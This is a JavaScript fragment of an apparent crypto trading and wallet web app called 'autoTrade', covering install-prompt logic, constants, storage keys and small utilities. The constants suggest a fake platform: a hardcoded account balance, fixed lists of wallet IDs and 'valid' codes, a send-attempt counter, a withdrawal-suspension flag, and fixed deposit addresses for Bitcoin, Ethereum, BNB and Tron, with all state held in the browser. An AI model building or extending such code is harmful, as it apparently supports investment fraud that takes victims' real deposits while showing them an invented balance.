// ====== INSTALL PROMPT LOGIC (PWA) ======
let deferredPrompt;
window.addEventListener('beforeinstallprompt', (e) => {
  e.preventDefault();
  deferredPrompt = e;
  show($('#installPrompt'));
});

$('#getMobileAppBtn').onclick = function() {
  if (deferredPrompt) {
    show($('#installPrompt'));
  } else {
    alert("To install: Use your browser's menu and select 'Add to Home screen'.");
  }
};
$('#installNowBtn').onclick = async function() {
  if (deferredPrompt) {
    deferredPrompt.prompt();
    const { outcome } = await deferredPrompt.userChoice;
    if (outcome === 'accepted') {
      hide($('#installPrompt'));
      alert('App is being installed! You can now launch it from your home screen.');
    }
  } else {
    alert("To install: Use your browser's menu and select 'Add to Home screen'.");
  }
};
$('#maybeLaterBtn').onclick = function() {
  hide($('#installPrompt'));
};

// ======= CONSTANTS =======
const TOTAL_BALANCE = 8250.78;
const USDT_DECIMALS = 6;
const walletAccountIDs = [
  "1048291756","9584207136","6732810945","4029158736","8164072395",
  "2057819463","9174623085","3841957260","5297401863","7609284153",
  "4632185097","5827049136","8714956203","6497012835","2396185740",
  "5048731962","7836241905","6104298735","9581726403","7246093815",
  "4308169527","8924056713","5179302468","3589172406","1497825036"
];
const validCodes = ["483921", "175064", "902718", "634285", "217509", "856430", "490127", "731694", "562803", "308417", "941256", "128374", "675820", "203519", "487960", "819432", "356701", "740528", "612947", "098135", "573864", "284691", "160738", "495260", "837514", "021693", "658407", "794135", "320586", "946172"];
let sendAttempts = 0;

// Deposit addresses (per network)
const depositAddresses = {
  "Bitcoin":   { addr: "bc1qv4fffwt8ux3k33n2dms5cdvuh6suc0gtfevxzu", label: "Bitcoin [BTC] Native" },
  "Ethereum":  { addr: "0xB36EDa1ffC696FFba07D4Be5cd249FE5E0118130", label: "Ethereum [ERC-20]" },
  "BNB":       { addr: "0xB36EDa1ffC696FFba07D4Be5cd249FE5E0118130", label: "BNB Smart Chain [BEP20]" },
  "Tron":      { addr: "TSt7yoNwGYRbtMMfkSAHE6dPs1cd9rxcco", label: "Tron [TRC-20]" }
};

// ========== STORAGE KEYS ==========
const LS = {
  user: "autoTrade_user",
  walletMap: "autoTrade_walletMap",
  transactions: "autoTrade_transactions",
  withdraws: "autoTrade_withdrawals",
  withdrawSusp: "autoTrade_withdrawSusp",
  tradePositions: "autoTrade_trades",
  notif: "autoTrade_notif",
  notifMsgs: "autoTrade_notifMsgs",
  twofa: "autoTrade_2fa",
  twofaStatus: "autoTrade_2faStatus",
  theme: "autoTrade_theme"
};

// ========== UTILS ==========
// DOM helpers
function $(sel) { return document.querySelector(sel); }
function $all(sel) { return Array.from(document.querySelectorAll(sel)); }
const sleep = ms => new Promise(r=>setTimeout(r,ms));
function fmtUsd(n) { return typeof n === 'number' ? n.toLocaleString('en-US', {style:'currency',currency:'USD'}) : n; }
function shortAddr(addr) {
  if (!addr || typeof addr !== 'string') return "";
  if (addr.startsWith('0x') && addr.length > 10)
    return addr.slice(0,6) + "..." + addr.slice(-4);
  if (addr.length > 12) return addr.slice(0,5)+"..."+addr.slice(-4);
  return addr;
}
function now() { return Math.floor(Date.now()/1000); }
function saveLS(key, val) { localStorage.setItem(key, JSON.stringify(val)); }
function getLS(key, fallback) { try { return JSON.parse(localStorage.getItem(key)) ?? fallback; } catch { return fallback; } }
function delLS(key) { localStorage.removeItem(key); }
function show(el) { el.classList.remove('hide'); }
function hide(el) { el.classList.add('hide'); }
function copyToClipboard(txt) { navigator.clipboard.writeText(txt); }
function daysBetween(a,b) { return Math.ceil((b-a)/86400); }
function formatCountdown(s) {
  let d = Math.floor(s/86400), h=Math.floor((s%86400)/3600), m=Math.floor((s%3600)/60), sec=(s%60);
  return `${d>0?d+"d ":""}${h}h ${m}m ${sec}s`;
}

// ... rest of your SPA application logic ...
